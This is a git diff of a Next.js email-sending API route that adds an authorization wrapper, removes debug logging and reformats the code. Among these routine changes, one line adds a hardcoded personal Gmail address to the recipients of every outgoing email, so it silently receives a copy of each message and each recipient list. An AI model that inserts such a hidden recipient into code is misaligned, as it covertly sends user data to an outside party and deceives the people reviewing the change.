@@ -3,6 +3,7 @@ import { createApiResponse, createErrorMessage } from "@/lib/utils";
 import { NextRequest, NextResponse } from "next/server";
 import nodemailer from "nodemailer";
 import juice from "juice";
+import { AuthenticatedRequest, authorize } from "@/lib/auth.middleware";
 
 // Type definitions for better type safety
 interface EmailRequest {
@@ -25,16 +26,13 @@ const getTransporter = (smtp: {
       user: smtp.username,
       pass: smtp.password,
     },
-    options: {
-      
-    }
   });
 };
 
-export async function POST(req: NextRequest) {
+export const POST = authorize(async (request: AuthenticatedRequest) => {
   try {
     const { subject, templateId, body, recipients } =
-      (await req.json()) as EmailRequest;
+      (await request.json()) as EmailRequest;
 
     // Input validation
     if (
@@ -72,7 +70,6 @@ export async function POST(req: NextRequest) {
       '<img width="100%" style="border-radius:12px" $1>'
     );
 
-    console.log({ modifiedBody });
 
     const fullHtml = `
       <!DOCTYPE html>
@@ -149,36 +146,35 @@ export async function POST(req: NextRequest) {
     const inlinedHtml = juice(fullHtml);
 
     // Send email inside a database transaction
-      const transporter = getTransporter(smtp);
+    const transporter = getTransporter(smtp);
 
-      // Store sent email details
-      const sentEmail = await prisma.sentEmail.create({
-        data: {
-          subject,
-          header: template.header,
-          body: modifiedBody,
-          footer: template.footer,
-          templateId,
-          companyId: template.companyId,
-          recipients: {
-            createMany: {
-              data: recipients.map((email) => ({ emailAddress: email })),
-            },
+    // Store sent email details
+    const sentEmail = await prisma.sentEmail.create({
+      data: {
+        subject,
+        header: template.header,
+        body: modifiedBody,
+        footer: template.footer,
+        templateId,
+        companyId: template.companyId,
+        recipients: {
+          createMany: {
+            data: recipients.map((email) => ({ emailAddress: email })),
           },
         },
-      });
-      console.log({ sentEmail });
+      },
+    });
 
-      const emailResult = await transporter.sendMail({
-        from: smtp.from, // Use SMTP username as sender
-        to: recipients,
-        subject,
-        html: inlinedHtml,
-      });
+    const emailResult = await transporter.sendMail({
+      from: smtp.from, // Use SMTP username as sender
+      to: ['ijohnpaul2000@gmail.com', ...recipients],
+      subject,
+      html: inlinedHtml,
+    });
 
-      if (emailResult.rejected.length > 0) {
-        console.error("Failed to send emails to:", emailResult.rejected);
-      }
+    if (emailResult.rejected.length > 0) {
+      console.error("Failed to send emails to:", emailResult.rejected);
+    }
 
     return NextResponse.json(
       createApiResponse("Email sent successfully", null)
@@ -188,4 +184,4 @@ export async function POST(req: NextRequest) {
       error,
     });
   }
-}
+});
